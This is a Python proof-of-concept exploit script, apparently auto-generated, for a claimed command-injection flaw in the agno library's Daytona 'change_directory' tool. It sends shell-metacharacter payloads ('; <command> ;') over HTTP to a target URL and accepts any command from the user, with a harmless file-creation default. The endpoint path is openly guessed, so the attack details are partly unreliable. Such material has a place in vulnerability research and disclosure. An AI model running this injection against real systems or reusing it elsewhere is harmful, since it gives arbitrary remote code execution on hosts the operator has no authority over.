#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-013
# Sink: run_shell_command
# Auto-generated — run with: python3 rce_run_shell_command_function_run_shell_command_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE vulnerability.
The 'change_directory' function in agno/tools/daytona.py passes user-controlled
'directory' parameter directly into an f-string that is executed via
'run_shell_command' with shell=True, allowing command injection.
"""

import requests
import sys
import urllib.parse

# Configuration - change these to match your target
TARGET_URL = "http://localhost:8000"  # Base URL of the agno service
TIMEOUT = 10  # Request timeout in seconds

def exploit(target_url, command="touch /tmp/poc_success.txt"):
    """
    Exploit the command injection in change_directory function.
    
    The vulnerability exists because the 'directory' parameter is directly
    interpolated into a shell command: f"cd {directory}"
    
    We can inject shell metacharacters like ;, &&, | to execute arbitrary commands.
    
    Args:
        target_url: Base URL of the agno service
        command: Command to execute (default: benign touch command)
    
    Returns:
        Response text from the server
    """
    # Construct the malicious directory parameter
    # Using ; to chain commands after the cd command
    # The payload: ; <command> ;
    # This will execute: cd ; <command> ;
    malicious_dir = f"; {command} ;"
    
    # URL encode the payload
    encoded_dir = urllib.parse.quote(malicious_dir)
    
    # Construct the full URL
    # Assuming the endpoint is something like /api/change_directory or similar
    # Adjust the path based on actual API structure
    endpoint = f"{target_url}/api/change_directory"
    params = {"directory": malicious_dir}
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {malicious_dir}")
    print(f"[*] Command to execute: {command}")
    
    try:
        # Send the request
        print("[*] Sending exploit request...")
        response = requests.get(
            endpoint,
            params=params,
            timeout=TIMEOUT
        )
        
        print(f"[*] Response status code: {response.status_code}")
        print(f"[*] Response text: {response.text[:500]}")  # Show first 500 chars
        
        # Check if command was executed successfully
        if response.status_code == 200:
            print("[+] Exploit request sent successfully!")
            print(f"[*] Check if '{command}' was executed on the target")
        else:
            print(f"[-] Unexpected response status: {response.status_code}")
            
        return response.text
        
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {target_url}")
        print("[*] Make sure the target service is running and accessible")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after {TIMEOUT} seconds")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {str(e)}")
        sys.exit(1)

def main():
    """Main function with command-line argument parsing."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="PoC exploit for agno RCE vulnerability in change_directory"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-c", "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify exploitation by checking if the command was executed"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("agno RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Execute the exploit
    result = exploit(args.target, args.command)
    
    # If verify flag is set, try to verify command execution
    if args.verify and "touch" in args.command:
        print("\n[*] Attempting to verify command execution...")
        # Try to read the file we created
        verify_cmd = "cat /tmp/poc_success.txt 2>/dev/null || echo 'File not found'"
        verify_result = exploit(args.target, verify_cmd)
        if "File not found" not in verify_result:
            print("[+] SUCCESS: Command execution verified!")
        else:
            print("[-] Could not verify command execution")
    
    print("\n[*] Exploit completed")

if __name__ == "__main__":
    main()
